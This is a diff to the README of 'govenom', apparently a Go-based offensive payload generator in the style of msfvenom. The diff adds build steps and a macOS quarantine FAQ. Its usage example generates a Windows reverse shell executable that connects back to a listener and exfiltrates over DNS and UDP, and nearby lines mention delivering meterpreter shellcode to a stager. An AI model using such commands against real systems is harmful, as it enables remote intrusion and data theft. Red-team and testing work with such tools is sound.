@@ -15,6 +15,8 @@
 Go. This makes it easy to cross-compile static binaries for a
 variety of target platforms. It is also much faster than `msfvenom`.
 
+---
+
 ## Payloads
 
 Currently, three payloads are supported:
@@ -72,6 +74,24 @@ that were exfiltrated via DNS.
 * **pusher:** The `pusher` tool can serve and deliver `meterpreter`
 shellcode generated using `msfvenom` to the `govenom` stager payload.
 
+## Building
+
+`govenom` can be built in two ways. It either generate payloads
+directly from the source code in the `./payloads` folder of this
+repos or it can be built with the source code embedded such that
+it works as a standalone binary. The binaries distributed with
+releases are standalone binaries.
+
+```bash
+# build a govenom binary that uses the payload code
+# directly from the repository
+go build
+
+# build a standalone govenom binary (see the standalone
+# Makefile section for the commands to build on Windows)
+make standalone
+```
+
 ## Usage
 
 Run `go run govenom.go` for detailed usage information. The following
@@ -81,23 +101,32 @@ exfiltration strategies:
 
 ```bash
 # generate a payload
-go run ./govenom.go payload xrsh -d 127.0.0.1:1337 \
+govenom payload xrsh -d 127.0.0.1:1337 \
     --os windows --arch 386 \
     --exfil dns:example.com,stdout,dial:udp:127.0.0.1:1234 \
     -o revsh.exe
 
 # run a tool
-go run ./govenom.go tool dnslogger
+govenom ./govenom.go tool dnslogger
 ```
 
 **Note:** Go has to be installed to run `govenom` itself and it is
 also used by `govenom` itself to build the selected payloads.
 
+## FAQ:
+---
+**The `govenom` integrity cannot be verified on macOS**
+macOS adds a quarantine attribute to downloaded binaries
+which you can remove with the following command:
+```
+xattr -d com.apple.quarantine ./govenom
+```
+---
+
 ## Plans
 
 * Connection encryption
 * Reverse shell listener like `ncat` with logging capabilities
-* Embedding payload source code into the `govenom` binary
-* Windows support for the `stager` payload
+* Linux support for the `stager` payload
 
 Thanks to [https://quasilyte.dev]() for the logo.
